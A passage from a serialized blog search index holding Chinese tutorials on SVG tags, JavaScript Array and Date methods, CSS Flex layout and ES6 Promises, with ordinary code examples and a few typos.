cx=\"5\" cy=\"5\" r=\"4\"/&gt; &lt;use href=\"#myuse\" x=\"10\" y=\"0\" fill=\"blue\" /&gt; &lt;use href=\"#myuse\" x=\"20\" y=\"0\" fill=\"white\" stroke=\"blue\" /&gt; &lt;/svg&gt; ``` &lt;svg viewBox=\"0 0 30 10\" xmlns=\"http://www.w3.org/2000/svg\"&gt; &lt;circle id=\"myuse\" cx=\"5\" cy=\"5\" r=\"4\"/&gt; &lt;use href=\"#myuse\" x=\"10\" y=\"0\" fill=\"blue\" /&gt; &lt;use href=\"#myuse\" x=\"20\" y=\"0\" fill=\"white\" stroke=\"blue\" /&gt; &lt;/svg&gt;11. `&lt;g&gt;` 标签 `&lt;g&gt;` 标签用于将多个形状组成一个组（group） ``` xml &lt;svg width=\"300\" height=\"100\"&gt; &lt;g id=\"myg\"&gt; &lt;text x=\"25\" y=\"20\"&gt;圆形&lt;/text&gt; &lt;circle cx=\"50\" cy=\"50\" r=\"20\"/&gt; &lt;/g&gt; &lt;use href=\"#myg\" x=\"100\" y=\"0\" fill=\"blue\" /&gt; &lt;use href=\"#myg\" x=\"200\" y=\"0\" fill=\"white\" stroke=\"blue\" /&gt; &lt;/svg&gt; 圆形 &lt;defs&gt; 标签&lt;defs&gt; 标签用于自定义形状，它内部的代码不会显示，仅供引用 123456789101112&lt;svg width=\"300\" height=\"100\"&gt; &lt;defs&gt; &lt;g id=\"myCircle\"&gt; &lt;text x=\"25\" y=\"20\"&gt;圆形&lt;/text&gt; &lt;circle cx=\"50\" cy=\"50\" r=\"20\"/&gt; &lt;/g&gt; &lt;/defs&gt; &lt;use href=\"#myCircle\" x=\"0\" y=\"0\" /&gt; &lt;use href=\"#myCircle\" x=\"100\" y=\"0\" fill=\"blue\" /&gt; &lt;use href=\"#myCircle\" x=\"200\" y=\"0\" fill=\"white\" stroke=\"blue\" /&gt;&lt;/svg&gt; 圆形 &lt;pattern&gt; 标签&lt;pattern&gt; 标签用于自定义一个形状，该形状可以被引用来平铺一个区域 12345678910&lt;svg width=\"500\" height=\"500\"&gt; &lt;defs&gt; &lt;pattern id=\"dots\" x=\"0\" y=\"0\" width=\"100\" height=\"100\" patternUnits=\"userSpaceOnUse\"&gt; &lt;circle fill=\"#bee9e8\" cx=\"50\" cy=\"50\" r=\"35\" /&gt; &lt;/pattern&gt; &lt;/defs&gt; &lt;rect x=\"0\" y=\"0\" width=\"100%\" height=\"100%\" fill=\"url(#dots)\" /&gt;&lt;/svg&gt; &lt;!-- patternUnits=\"userSpaceOnUse\"表示&lt;pattern&gt;的宽度和长度是实际的像素值 --&gt; &lt;image&gt; 标签&lt;image&gt; 标签用于插入图片文件 123&lt;svg viewBox=\"0 0 100 100\" width=\"100\" height=\"100\"&gt; &lt;image xlink:href=\"//avatars3.githubusercontent.com/u/22409333?s=460&amp;v=4\" width=\"50%\" height=\"50%\"/&gt;&lt;/svg&gt;","categories":[],"tags":[{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://jiuylq.github.io/tags/HTML-CSS/"}]},{"title":"Array笔记","slug":"Array","date":"2018-09-07T07:51:28.000Z","updated":"2019-04-07T05:17:16.587Z","comments":true,"path":"2018/09/07/Array/","link":"","permalink":"https://jiuylq.github.io/2018/09/07/Array/","excerpt":"本文总结了一些js数组的常用方法","text":"本文总结了一些js数组的常用方法 Array笔记 1、创建数组的方法 属性 length length属性表示数组的长度，即其中元素的个数。JavaScript数组的length属性是可变的，当length属性被设置得更大时，整个数组的状态事实上不会发生变化，仅仅是length属性变大；当length属性被设置得比原来小时，则原先数组中索引大于或等于length的元素的值全部被丢失。 prototype 返回对象类型原型的引用。prototype 属性是 object 共有的。一般用来给数组实例添加方法。 constructor 表示创建对象的函数。 说明：constructor 属性是所有具有 prototype 的对象的成员。constructor 属性保存了对构造特定对象实例的函数的引用。 1.1 使用Array构造函数:var arr1 = new Array(); //创建一个空数组 var arr2 = new Array(0); //创建一个包含10个项的数组 var arr3 = new Array(\"lily\",\"lucy\",\"Tom\"); //创建一个包含3个字符串的数组 1.2 使用数组字面量：var arr4 = []; //创建一个空数组 var arr5 = [10]; //创建一个包含包含10的数组 var arr6 = [\"lily\",\"lucy\",\"Tom\"]; //创建一个包3个字符串的数组 1.3 使用Array.of()创建数组var arr = Array.of(7); // 创建数组并赋值 [7] var arr = Array.of(1, 2, 3); // 创建数组并赋值 [1, 2, 3] 2 检测数组//判断一个对象是否时数组 var arr = []; if(arr instanceof Array){} //方法一 if(Object.prototype.toString.call(arr) == '[object Array]'){} //方法二 if(Array.isArray(arr)){} //方法四 if(arr.constructor == Array){} //方法四 3 数组方法 isArray, from, ofArray.isArray(obj) 检测对象是否是A容榕阿姨，是则返回true,否则返回false。 Array.from(arrayLike,mapFn,thisArg) 该方法从一个类数组或可迭代对象创建一个新的数组实例。参数arrayLike是想要转换成真实数组的类数组对象或可遍历对象。mapFn是可选参数，如果指定了该参数，则最后生成的数组会经过该函数的加工处理后再返回。thisArg时可选参数，为执行mapFn函数时this的值。 所谓类似数组的对象，本质特征只有一点，即必须有length属性。因此，任何有length属性的对象，都可以通过Array.from方法转换为数组。 实际应用中，常见的类似数组的对象是 DOM 操作返回的 NodeList 集合，以及函数内部的 arguments 对象。 let arrayLike = { 0:'a', 1:'b', 2:'c', length:3 }; let arrayLike2 = {length:3}; let str = 'abc'; let newArray = Array.from(arrayLike) //['a','b','c'] let newArray2 = Array.from(arrayLike, (v) =&gt; v+'1') //['a1','b1','c1'] let newArray3 = Array.from(arrayLike2) //[undefined,undefined,undefined] let newArray4 = Array.from(str) //['a','b','c'] Array.of(item…) 该方法用于创建数组实例。该方法用于代替Array()或new Array().Array.or()和Array构造函数之间的区别在于处理整数参数：Array.of(6)创建一个具有单个元素6的数组，而Array(6)则创建一个包含6个undefined元素的数组。 Array.of(7); // [7] Array.of(1, 2, 3); // [1, 2, 3] Array(7); // [ , , , , , , ] Array(1, 2, 3); // [1, 2, 3] 数组实例 所有数组实例都会从Array.prototype继承属性和方法。修改Array的原型会影响到所有的数组实例。 属性 Array.prototype.constructor 所有的数组实例都继承了这个属性，它的值就是 Array，表明了所有的数组都是由 Array 构造出来的。 Array.prototype.length 上面说了，因为 Array.prototype 也是个数组，所以它也有 length 属性，这个值为 0，因为它是个空数组。 方法 修改器方法下面的这些方法会改变调用它们的对象自身的值： push()push()方法将一个或多个元素添加到数组的末尾，并返回新数组的长度 语法arr.push(element1, …, elementN)返回值：返回新的数组的长度。 添加元素到数组`javascriptvar sports = [“soccer”, “baseball”];var total = sports.push(“football”, “swimming”); console.log(sports);// [“soccer”, “baseball”, “football”, “swimming”] console.log(total); // 4 &gt;*合并两个数组* 使用 apply() 添加第二个数组的所有元素 ```javascript var vegetables = [&apos;parsnip&apos;, &apos;potato&apos;]; var moreVegs = [&apos;celery&apos;, &apos;beetroot&apos;]; // 将第二个数组融合进第一个数组 // 相当于 vegetables.push(&apos;celery&apos;, &apos;beetroot&apos;); Array.prototype.push.apply(vegetables, moreVegs); console.log(vegetables); // [&apos;parsnip&apos;, &apos;potato&apos;, &apos;celery&apos;, &apos;beetroot&apos;] pop() pop()方法从数组中删除最后一个元素，并返回该元素的值。吃方法更改数组的长度。 语法arr.pop()返回值：从数组中删除的元素(当数组为空时返回undefined)。 let arr = [1, 2, 3]; arr.length; // 3 arr.pop(); // 3 console.log(arr); // [1, 2] arr.length; // 2 unshift() unshift()方法将一个或多个元素添加到数组的开头，并返回新数组的长度。 语法arr.unshift(element1, …, elementN)返回值：返回新数组的长度 let arr = [1,2,3]; arr.unshift(4,5); console.log(arr) //[4,5,1,2,3] shift() shift()方法从数组中删除第一个元素，并返回该元素的值。此方法更改数组的长度。 语法arr.shift()返回值：从数组中删除的元素；(当数组为空时返回undefined) let arr1 = [1,2,3]; let arr2 = arr1.shift(); console.log(arr1); //[2,3] console.log(arr2); //1 splice() splice()方法通过删除现有的元素或添加新元素来更改一个数组的内容（在任意的位置给数组添加或删除任意个元素）。 语法array.splice(start[, deleteCount[, item1[, item2[, …]]]]) 参数start 指定修改的开始位置（从0计数）。如果超出了数组的长度，则从数组末尾开始添加内容；如果是负值，则表示从数组末位开始的第几位（从-1计数）；若只使用start参数而不使用deleteCount、item，如：array.splice(start) ，表示删除[start，end]的元素。deleteCount 可选 整数，表示要移除的数组元素的个数。如果 deleteCount 是 0，则不移除元素。这种情况下，至少应添加一个新元素。如果 deleteCount 大于start 之后的元素的总数，则从 start 后面的元素都将被删除（含第 start 位）。如果deleteCount被省略，则其相当于(arr.length - start)。item1, item2, … 可选 要添加进数组的元素,从start 位置开始。如果不指定，则 splice() 将只删除数组元素。splice方法使用deleteCount参数来控制是删除还是添加：start参数是必须的，表示开始的位置（从0计数），如：start=0从第一个开始；start&gt;= array.length-1表示从最后一个开始。①、从start位置开始删除[start，end]的元素。array.splice(start)②、从start位置开始删除[start，Count]的元素。array.splice(start, deleteCount)③、从start位置开始添加item1, item2, …元素。array.splice(start, 0, item1, item2, …) var months = ['Jan', 'March', 'April', 'June']; months.splice(1, 0, 'Feb'); // inserts at 1st index position console.log(months); // expected output: Array ['Jan', 'Feb', 'March', 'April', 'June'] months.splice(4, 1, 'May'); // replaces 1 element at 4th index console.log(months); // expected output: Array ['Jan', 'Feb', 'March', 'April', 'May'] sort()sort() 方法对数组的元素进行排序，并返回数组。 sort 排序不一定是稳定的。默认排序顺序是根据字符串Unicode码点。 语法arr.sort()arr.sort(compareFunction)compareFunction 可选。用来指定按某种顺序进行排列的函数。如果省略，元素按照转换为的字符串的各个字符的Unicode位点进行排序。返回值：返回排序后的数组。原数组已经被排序后的数组代替 //数组排序 var arr = [2,3,1,5,4] arr.sort(function(a, b) { return a - b }) // [1,2,3,4,5] //对象可以按照某个属性排序： var items = [ { name: 'Edward', value: 21 }, { name: 'Sharpe', value: 37 }, { name: 'And', value: 45 }, { name: 'The', value: -12 }, { name: 'Magnetic' }, { name: 'Zeros', value: 37 } ]; // sort by value items.sort(function (a, b) { return (a.value - b.value) }); // sort by name items.sort(function(a, b) { var nameA = a.name.toUpperCase(); // ignore upper and lowercase var nameB = b.name.toUpperCase(); // ignore upper and lowercase if (nameA &lt; nameB) { return -1; } if (nameA &gt; nameB) { return 1; } // names must be equal return 0; }); reverse()reverse()方法讲述组中的元素位置颠倒。 语法arr.reverse() var array1 = ['one', 'two', 'three']; var reversed = array1.reverse(); console.log(array1); // expected output: Array ['three', 'two', 'one'] console.log(reversed); // expected output: Array ['three', 'two', 'one'] fill()fill() 方法用一个固定值填充一个数组中从起始索引到终止索引内的全部元素。 语法arr.fill(value[, start[, end]]) 参数value用来填充数组元素的值。start 可选起始索引，默认值为0。end 可选终止索引，默认值为 this.length。 返回值：修改后的数组 var array1 = [1, 2, 3, 4]; // fill with 0 from position 2 until position 4 console.log(array1.fill(0, 2, 4)); // expected output: [1, 2, 0, 0] // fill with 5 from position 1 console.log(array1.fill(5, 1)); // expected output: [1, 5, 5, 5] console.log(array1.fill(6)); // expected output: [6, 6, 6, 6] copyWithin()copyWithin() 方法浅复制数组的一部分到同一数组中的另一个位置，并返回它，而不修改其大小。 语法arr.copyWithin(target[, start[, end]]) 参数target 0 为基底的索引，复制序列到该位置。如果是负数，target 将从末尾开始计算。 如果 target 大于等于 arr.length，将会不发生拷贝。如果 target 在 start 之后，复制的序列将被修改以符合 arr.length。start 0 为基底的索引，开始复制元素的起始位置。如果是负数，start 将从末尾开始计算。 如果 start 被忽略，copyWithin 将会从0开始复制。end 0 为基底的索引，开始复制元素的结束位置。copyWithin 将会拷贝到该位置，但不包括 end 这个位置的元素。如果是负数， end 将从末尾开始计算。 如果 end 被忽略，copyWithin 将会复制到 arr.length。 返回值：改变了的数组。 var array1 = [1, 2, 3, 4, 5]; // place at position 0 the element between position 3 and 4 console.log(array1.copyWithin(0, 3, 4)); // expected output: Array [4, 2, 3, 4, 5] // place at position 1 the elements after position 3 console.log(array1.copyWithin(1, 3)); // expected output: Array [4, 4, 5, 4, 5] 访问方法 下面的这些方法会改变调用它们的对象自身的值：","categories":[{"name":"Javascript","slug":"Javascript","permalink":"https://jiuylq.github.io/categories/Javascript/"}],"tags":[{"name":"Array","slug":"Array","permalink":"https://jiuylq.github.io/tags/Array/"}]},{"title":"Flex布局","slug":"Flex","date":"2018-03-07T07:51:28.000Z","updated":"2019-04-07T05:10:31.072Z","comments":true,"path":"2018/03/07/Flex/","link":"","permalink":"https://jiuylq.github.io/2018/03/07/Flex/","excerpt":"Flex布局Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。","text":"Flex布局Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。 Flex 布局 Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。 一、容器 12345678910//容器设置.box &#123; display: flex;&#125;//行内元素也可设置.box &#123; display: inline-flex;&#125;//Webkit 内核的浏览器，必须加上-webkit 前缀。 注意，设为 Flex 布局以后，子元素的 float、clear 和 vertical-align 属性将失效。 二、容器属性 容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做 main start，结束位置叫做 main end；交叉轴的开始位置叫做 cross start，结束位置叫做 cross end。项目默认沿主轴排列。单个项目占据的主轴空间叫做 main size，占据的交叉轴空间叫做 cross size。 以下 6 个属性设置在容器上。 flex-direction || flex-wrap || flex-flow || justify-content || align-items || align-content flex-direction flex-direction 属性决定主轴的方向（即项目的排列方向）。 row（默认值）：主轴为水平方向，起点在左端。 row-reverse：主轴为水平方向，起点在右端。 column：主轴为垂直方向，起点在上沿。 column-reverse：主轴为垂直方向，起点在下沿。 123box &#123; flex-direction: row | row-reverse | column | column-reverse;&#125; flex-wrap 默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap 属性定义，如果一条轴线排不下，如何换行。 nowrap（默认）：不换行。 wrap：换行，第一行在上方。 wrap-reverse：换行，第一行在下方。 123.box &#123; flex-wrap: nowrap | wrap | wrap-reverse;&#125; flex-flow flex-flow 属性是 flex-direction 属性和 flex-wrap 属性的简写形式，默认值为 row nowrap。 123.box &#123; flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;&#125; justify-content justify-content 属性定义了项目在主轴上的对齐方式。它可能取 5 个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。 flex-start（默认值）：左对齐 flex-end：右对齐 center： 居中 space-between：两端对齐，项目之间的间隔都相等。 space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。 1234.box &#123; justify-content: flex-start | flex-end | center | space-between | space-around;&#125; align-items align-items 属性定义项目在交叉轴上如何对齐。 它可能取 5 个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。 flex-start：交叉轴的起点对齐。 flex-end：交叉轴的终点对齐。 center：交叉轴的中点对齐。 baseline: 项目的第一行文字的基线对齐。 stretch（默认值）：如果项目未设置高度或设为 auto，将占满整个容器的高度。 123.box &#123; align-items: flex-start | flex-end | center | baseline | stretch;&#125; align-content align-content 属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。 flex-start：与交叉轴的起点对齐。 flex-end：与交叉轴的终点对齐。 center：与交叉轴的中点对齐。 space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。 space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。 stretch（默认值）：轴线占满整个交叉轴。 1234.box &#123; align-content: flex-start | flex-end | center | space-between | space-around | stretch;&#125; 三、项目的属性 以下 6 个属性设置在项目上。 order || flex-grow || flex-shrink || flex-basis || flex || align-self order order 属性定义项目的排列顺序。数值越小，排列越靠前，默认为 0。 123.item &#123; order: &lt;integer&gt;;&#125; flex-grow flex-grow 属性定义项目的放大比例，默认为 0，即如果存在剩余空间，也不放大。 123.item &#123; flex-grow: &lt;number&gt;; /* default 0 */&#125; 如果所有项目的 flex-grow 属性都为 1，则它们将等分剩余空间（如果有的话）。如果一个项目的 flex-grow 属性为 2，其他项目都为 1，则前者占据的剩余空间将比其他项多一倍 flex-shrink flex-shrink 属性定义了项目的缩小比例，默认为 1，即如果空间不足，该项目将缩小。 123.item &#123; flex-shrink: &lt;number&gt;; /* default 1 */&#125; 如果所有项目的 flex-shrink 属性都为 1，当空间不足时，都将等比例缩小。如果一个项目的 flex-shrink 属性为 0，其他项目都为 1，则空间不足时，前者不缩小。负值对该属性无效。 flex-basis flex-basis 属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为 auto，即项目的本来大小。 123.item &#123; flex-basis: &lt;length&gt; | auto; /* default auto */&#125; 它可以设为跟 width 或 height 属性一样的值（比如 350px），则项目将占据固定空间。 flex flex 属性是 flex-grow, flex-shrink 和 flex-basis 的简写，默认值为 0 1 auto。后两个属性可选。 123.item &#123; flex: none | [ &lt; \"flex-grow\" &gt; &lt; \"flex-shrink\" &gt;? || &lt; \"flex-basis\" &gt; ];&#125; 该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。 align-self align-self 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖 align-items 属性。默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。 123.item &#123; align-self: auto | flex-start | flex-end | center | baseline | stretch;&#125; 该属性可能取 6 个值，除了 auto，其他都与 align-items 属性完全一致。 https://www.runoob.com/w3cnote/flex-grammar.html（完）","categories":[{"name":"CSS","slug":"CSS","permalink":"https://jiuylq.github.io/categories/CSS/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://jiuylq.github.io/tags/CSS/"}]},{"title":"js-date","slug":"js-date","date":"2018-01-07T07:51:28.000Z","updated":"2018-10-19T12:57:32.776Z","comments":true,"path":"2018/01/07/js-date/","link":"","permalink":"https://jiuylq.github.io/2018/01/07/js-date/","excerpt":"唉，最近越来越懒了，博客拖更了。今天让我们来谈谈javascript中的日期Date对象，及其相关的用法。","text":"唉，最近越来越懒了，博客拖更了。今天让我们来谈谈javascript中的日期Date对象，及其相关的用法。 一、日期对象 在javascript中并没有日期型的数据类型，但是提供了一个日期对象可以操作日期和时间。日期对象的创建：new Date(); 二、将日期对象转换为字符串 将日期对象转换为字符串可以使用以下4种方法：date.toString();//将日期对象转换为字符串时，采用的是本地时间date.toLocalString();//将日期对象转换为字符串，采用的是本地时间，显示的是地方日期的格式date.toUTCString();//将日期对象转换为字符串时，采用的是世界时间。date.toGMTString();//将日期对象转换为字符串时，采用的是GMT时间，但是已被禁止使用，一般用toUTCString()方法来替换。 三、将日期对象中的日期和时间转换为字符串 date.toDateString();//将日期部分转换为字符串，本地时间date.toLocalDateString();//将日期部分转换为字符串，采用的是本地时间，显示的是地方日期的格式date.toTimeString();//将时间部分转换为字符串，本地时间date.toLocalTimeString();将时间部分转换为字符串，采用的是本地时间，显示的是地方日期的格式 四、日期对象中的日期 date.getYear();//获取年份，但不建议使用。date.getFullYear();//获取年份，，以四位数显式，建议使用date.getMonth();//获取月份，值为0-11，一月份为0，二月份为1…date.getDate();//获取天数，即一个月中的某一天date.getDay();//获取一周中的第几天，值为0-6，周日为0… 五、日期对象中的时间 date.getHours();//返回小时部分date.getMinutes();//返回分钟部分date.getSeconds();//返回秒钟部分date.getMilliseconds();//返回毫秒部分date.getTime();//返回日期对象中的时间与1970年1月1日0时0分0秒所间隔的毫秒数date.getTimezoneoffset();//返回日期对象中的时间与UTC之间的时差数，单位为秒。 六、设置日期对象中的日期e date.setYear(year);//不建议使用date.setFullYear(year,month,day);//year四位数;month：0-11，该参数可省略;day：1-31， 该参数可省略date.setMonth(month,day);//month：0-11;day：1-31， 该参数可省略date.getDate(day);//day：1-31 七、设置日期对象中的时间 date.getHours(hours,minutes,seconds,milliseconds);//hours:0-23,minutes:0-59,可省略，seconds:0-59,可省略milliseconds:0-999，可省略date.getMinutes(minutes,seconds,milliseconds);//minutes:0-59,seconds:0-59,可省略milliseconds:0-999，可省略date.getSeconds(seconds,milliseconds);// seconds:0-59,milliseconds:0-999，可省略date.getMilliseconds(milliseconds);//,milliseconds:0-999 八、与毫秒相关的方法 date.setTime(millisecinds);milliseconds代表设置的时间与1970年1月1日0时0分0秒所间隔的毫秒数date.valueOf();返回日期对象中的时间与1970年1月1日0时0分0秒所间隔的毫秒数date.parse(str);返回str参数所代表的时间与1970年1月1日0时0分0秒所间隔的毫秒数date.UTC(year,month,day,hours,minutes,seconds,milliseconds);将参数所代表的日期转换成与1970年1月1日0时0分0秒所间隔的毫秒数 实例1、获取时间截12345678//一var timestamp = new Date().getTime(); //new Date(\"2012/7/25 20:11:11\").getTime()//二var timestamp = (new Date()).valueOf()// 三var timestamp = +new Date() //相当于ToNumber(new Date())// 四var timestamp = Date.now() 2、格式化时间123456789101112131415161718//使用方法：var val=new Date(\"2012/7/25 20:11:11\").getTime() var crtTime = new Date(val); dateFtt(\"yyyy-MM-dd q hh:mm:ss\",crtTime);function dateFtt(fmt,date) &#123;var o = &#123; \"M+\" : date.getMonth()+1, //月份 \"d+\" : date.getDate(), //日 \"h+\" : date.getHours(), //小时 \"m+\" : date.getMinutes(), //分 \"s+\" : date.getSeconds(), //秒 \"q+\" : Math.floor((date.getMonth()+3)/3), //季度 \"S\" : date.getMilliseconds() //毫秒 &#125;; if(/(y+)/.test(fmt)) fmt=fmt.replace(RegExp.$1, (date.getFullYear()+\"\").substr(4 - RegExp.$1.length)); for(var k in o) if(new RegExp(\"(\"+ k +\")\").test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length==1) ? (o[k]) : ((\"00\"+ o[k]).substr((\"\"+ o[k]).length))); return fmt; &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344 /* * 对Date的扩展，将 Date 转化为指定格式的String * 月(M)、日(d)、12小时(h)、24小时(H)、分(m)、秒(s)、周(E)、季度(q) 可以用 1-2 个占位符 * 年(y)可以用 1-4 个占位符，毫秒(S)只能用 1 个占位符(是 1-3 位的数字) * eg: * (new Date()).pattern(\"yyyy-MM-dd hh:mm:ss.S\")==&gt; 2006-07-02 08:09:04.423 * (new Date()).pattern(\"yyyy-MM-dd E HH:mm:ss\") ==&gt; 2009-03-10 二 20:09:04 * (new Date()).pattern(\"yyyy-MM-dd EE hh:mm:ss\") ==&gt; 2009-03-10 周二 08:09:04 * (new Date()).pattern(\"yyyy-MM-dd EEE hh:mm:ss\") ==&gt; 2009-03-10 星期二 08:09:04 * (new Date()).pattern(\"yyyy-M-d h:m:s.S\") ==&gt; 2006-7-2 8:9:4.18 */ Date.prototype.pattern=function(fmt) &#123; var o = &#123; \"M+\" : this.getMonth()+1, //月份 \"d+\" : this.getDate(), //日 \"h+\" : this.getHours()%12 == 0 ? 12 : this.getHours()%12, //小时 \"H+\" : this.getHours(), //小时 \"m+\" : this.getMinutes(), //分 \"s+\" : this.getSeconds(), //秒 \"q+\" : Math.floor((this.getMonth()+3)/3), //季度 \"S\" : this.getMilliseconds() //毫秒 &#125;; var week = &#123; \"0\" : \"\\u65e5\", \"1\" : \"\\u4e00\", \"2\" : \"\\u4e8c\", \"3\" : \"\\u4e09\", \"4\" : \"\\u56db\", \"5\" : \"\\u4e94\", \"6\" : \"\\u516d\" &#125;; if(/(y+)/.test(fmt))&#123; fmt=fmt.replace(RegExp.$1, (this.getFullYear()+\"\").substr(4 - RegExp.$1.length)); &#125; if(/(E+)/.test(fmt))&#123; fmt=fmt.replace(RegExp.$1, ((RegExp.$1.length&gt;1) ? (RegExp.$1.length&gt;2 ? \"\\u661f\\u671f\" : \"\\u5468\") : \"\")+week[this.getDay()+\"\"]); &#125; for(var k in o)&#123; if(new RegExp(\"(\"+ k +\")\").test(fmt))&#123; fmt = fmt.replace(RegExp.$1, (RegExp.$1.length==1) ? (o[k]) : ((\"00\"+ o[k]).substr((\"\"+ o[k]).length))); &#125; &#125; return fmt; &#125; var date = new Date(); window.alert(date.pattern(\"yyyy-MM-dd hh:mm:ss\"));","categories":[{"name":"js","slug":"js","permalink":"https://jiuylq.github.io/categories/js/"}],"tags":[{"name":"js-date","slug":"js-date","permalink":"https://jiuylq.github.io/tags/js-date/"}]},{"title":"Promise","slug":"promise","date":"2018-01-03T14:35:37.000Z","updated":"2018-02-03T14:04:12.635Z","comments":true,"path":"2018/01/03/promise/","link":"","permalink":"https://jiuylq.github.io/2018/01/03/promise/","excerpt":"ES6 Promise对象讲解及其用法！","text":"ES6 Promise对象讲解及其用法！ Promise 对象Promise 的含义Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6 将其写进了语言标准，统一了用法，原生提供了Promise对象。 所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。Promise 提供统一的 API，各种异步操作都可以用同样的方法进行处理。 Promise对象有以下两个特点。 （1）对象的状态不受外界影响。Promise对象代表一个异步操作，有三种状态：pending（进行中）、fulfilled（已成功）和rejected（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。这也是Promise这个名字的由来，它的英语意思就是“承诺”，表示其他手段无法改变。 （2）一旦状态改变，就不会再变，任何时候都可以得到这个结果。Promise对象的状态改变，只有两种可能：从pending变为fulfilled和从pending变为rejected。只要这两种情况发生，状态就凝固了，不会再变了，会一直保持这个结果，这时就称为 resolved（已定型）。如果改变已经发生了，你再对Promise对象添加回调函数，也会立即得到这个结果。这与事件（Event）完全不同，事件的特点是，如果你错过了它，再去监听，是得不到结果的。 注意，为了行文方便，本章后面的resolved统一只指fulfilled状态，不包含rejected状态。 有了Promise对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。此外，Promise对象提供统一的接口，使得控制异步操作更加容易。 Promise也有一些缺点。首先，无法取消Promise，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，Promise内部抛出的错误，不会反应到外部。第三，当处于pending状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。 如果某些事件不断地反复发生，一般来说，使用 Stream 模式是比部署Promise更好的选择。 基本用法ES6 规定，Promise对象是一个构造函数，用来生成Promise实例。 下面代码创造了一个Promise实例。 123456789const promise = new Promise(function(resolve, reject) &#123; // ... some code if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; reject(error); &#125;&#125;); Promise构造函数接受一个函数作为参数，该函数的两个参数分别是resolve和reject。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。 resolve函数的作用是，将Promise对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；reject函数的作用是，将Promise对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。 Promise实例生成以后，可以用then方法分别指定resolved状态和rejected状态的回调函数。 12345promise.then(function(value) &#123; // success&#125;, function(error) &#123; // failure&#125;); then方法可以接受两个回调函数作为参数。第一个回调函数是Promise对象的状态变为resolved时调用，第二个回调函数是Promise对象的状态变为rejected时调用。其中，第二个函数是可选的，不一定要提供。这两个函数都接受Promise对象传出的值作为参数。 下面是一个Promise对象的简单例子。 123456789function timeout(ms) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(resolve, ms, 'done'); &#125;);&#125;timeout(100).then((value) =&gt; &#123; console.log(value);&#125;); 上面代码中，timeout方法返回一个Promise实例，表示一段时间以后才会发生的结果。过了指定的时间（ms参数）以后，Promise实例的状态变为resolved，就会触发then方法绑定的回调函数。 Promise 新建后就会立即执行。 1234567891011121314let promise = new Promise(function(resolve, reject) &#123; console.log('Promise'); resolve();&#125;);promise.then(function() &#123; console.log('resolved.');&#125;);console.log('Hi!');// Promise// Hi!// resolved 上面代码中，Promise 新建后立即执行，所以首先输出的是Promise。然后，then方法指定的回调函数，将在当前脚本所有同步任务执行完才会执行，所以resolved最后输出。 下面是异步加载图片的例子。 123456789101112131415function loadImageAsync(url) &#123; return new Promise(function(resolve, reject) &#123; const image = new Image(); image.onload = function() &#123; resolve(image); &#125;; image.onerror = function() &#123; reject(new Error('Could not load image at ' + url)); &#125;; image.src = url; &#125;);&#125; 上面代码中，使用Promise包装了一个图片加载的异步操作。如果加载成功，就调用resolve方法，否则就调用reject方法。 下面是一个用Promise对象实现的 Ajax 操作的例子。 1234567891011121314151617181920212223242526272829const getJSON = function(url) &#123; const promise = new Promise(function(resolve, reject)&#123; const handler = function() &#123; if (this.readyState !== 4) &#123; return; &#125; if (this.status === 200) &#123; resolve(this.response); &#125; else &#123; reject(new Error(this.statusText)); &#125; &#125;; const client = new XMLHttpRequest(); client.open(\"GET\", url); client.onreadystatechange = handler; client.responseType = \"json\"; client.setRequestHeader(\"Accept\", \"application/json\"); client.send(); &#125;); return promise;&#125;;getJSON(\"/posts.json\").then(function(json) &#123; console.log('Contents: ' + json);&#125;, function(error) &#123; console.error('出错了', error);&#125;); 上面代码中，getJSON是对 XMLHttpRequest 对象的封装，用于发出一个针对 JSON 数据的 HTTP 请求，并且返回一个Promise对象。需要注意的是，在getJSON内部，resolve函数和reject函数调用时，都带有参数。 如果调用resolve函数和reject函数时带有参数，那么它们的参数会被传递给回调函数。reject函数的参数通常是Error对象的实例，表示抛出的错误；resolve函数的参数除了正常的值以外，还可能是另一个 Promise 实例，比如像下面这样。 12345678const p1 = new Promise(function (resolve, reject) &#123; // ...&#125;);const p2 = new Promise(function (resolve, reject) &#123; // ... resolve(p1);&#125;) 上面代码中，p1和p2都是 Promise 